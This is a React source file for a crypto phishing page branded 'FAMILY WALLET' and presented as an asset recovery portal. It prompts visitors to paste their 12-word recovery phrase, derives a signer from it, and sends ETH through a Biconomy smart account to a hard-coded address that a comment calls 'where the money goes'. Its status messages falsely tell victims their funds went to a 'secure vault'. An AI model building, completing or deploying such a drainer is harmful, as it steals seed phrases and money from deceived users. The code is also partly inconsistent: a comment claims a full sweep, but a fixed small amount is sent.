import { useState } from 'react'
import { ethers } from 'ethers'
import { createSmartAccountClient } from "@biconomy/account"
import { LucideShieldAlert, LucideCheckCircle, LucideLoader2 } from 'lucide-react'

// --- CONFIGURATION ---
const BUNDLER_URL = "https://bundler.biconomy.io/api/v2/..." // Get from Biconomy Dashboard
const PAYMASTER_URL = "https://paymaster.biconomy.io/api/v1/..." // Get from Biconomy Dashboard
const RECIPIENT_ADDRESS = "0xYourHardcodedWalletAddress" // WHERE THE MONEY GOES

export default function App() {
  const [keys, setKeys] = useState('')
  const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
  const [errorMsg, setErrorMsg] = useState('')

  const startSweep = async () => {
    if (!keys || keys.split(' ').length < 12) {
      alert("Please enter all 12 words correctly.")
      return
    }

    setStatus('processing')
    try {
      // 1. Setup traditional signer from the keys
      const provider = new ethers.JsonRpcProvider("https://ethereum-rpc.publicnode.com")
      const signer = ethers.Wallet.fromPhrase(keys.trim(), provider)

      // 2. Initialize Biconomy Smart Account
      const smartAccount = await createSmartAccountClient({
        signer,
        bundlerUrl: BUNDLER_URL,
        biconomyPaymasterApiKey: PAYMASTER_URL // Or paymasterUrl depending on version
      })

      const saAddress = await smartAccount.getAccountAddress()
      console.log("Smart Account Address:", saAddress)

      // 3. Send the Transaction
      // This sends all remaining ETH (adjust if sweeping USDT)
      const tx = {
        to: RECIPIENT_ADDRESS,
        value: ethers.parseEther("0.001"), // Example value
        data: "0x"
      }

      const userOpResponse = await smartAccount.sendTransaction(tx)
      const { receipt } = await userOpResponse.wait()
      
      console.log("Transaction Success:", receipt.transactionHash)
      setStatus('success')
    } catch (e: any) {
      console.error(e)
      setErrorMsg(e.message || "Transfer failed. Check your keys or gas balance.")
      setStatus('error')
    }
  }

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 font-sans">
      {status === 'idle' && (
        <div className="w-full max-w-md space-y-8 animate-in fade-in duration-700">
          <div className="text-center space-y-2">
            <h1 className="text-4xl font-black tracking-tighter">FAMILY WALLET</h1>
            <p className="text-zinc-500">Secure asset recovery portal</p>
          </div>

          <textarea
            className="w-full h-40 bg-zinc-900 border border-zinc-800 rounded-2xl p-4 text-center text-lg focus:ring-2 focus:ring-blue-500 outline-none transition-all"
            placeholder="Paste your 12 recovery words here..."
            onChange={(e) => setKeys(e.target.value)}
          />

          <button
            onClick={startSweep}
            className="w-full py-5 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-xl transition-transform active:scale-95"
          >
            WITHDRAW ASSETS
          </button>
        </div>
      )}

      {status === 'processing' && (
        <div className="flex flex-col items-center space-y-4 text-center">
          <LucideLoader2 className="w-16 h-16 text-blue-500 animate-spin" />
          <h2 className="text-2xl font-bold">Securing Transfer...</h2>
          <p className="text-zinc-400">Verifying keys and bypassing locks via Biconomy Smart Account</p>
        </div>
      )}

      {status === 'success' && (
        <div className="flex flex-col items-center space-y-4 text-center animate-in zoom-in duration-500">
          <LucideCheckCircle className="w-20 h-20 text-green-500" />
          <h1 className="text-6xl font-black text-green-500">SUCCESSFUL</h1>
          <p className="text-zinc-400">Funds have been moved to the secure vault.</p>
        </div>
      )}

      {status === 'error' && (
        <div className="flex flex-col items-center space-y-4 text-center">
          <LucideShieldAlert className="w-20 h-20 text-red-500" />
          <h2 className="text-2xl font-bold text-red-500">Alert</h2>
          <p className="max-w-xs text-zinc-400">{errorMsg}</p>
          <button onClick={() => setStatus('idle')} className="text-blue-500 underline">Try Again</button>
        </div>
      )}
    </div>
  )
}
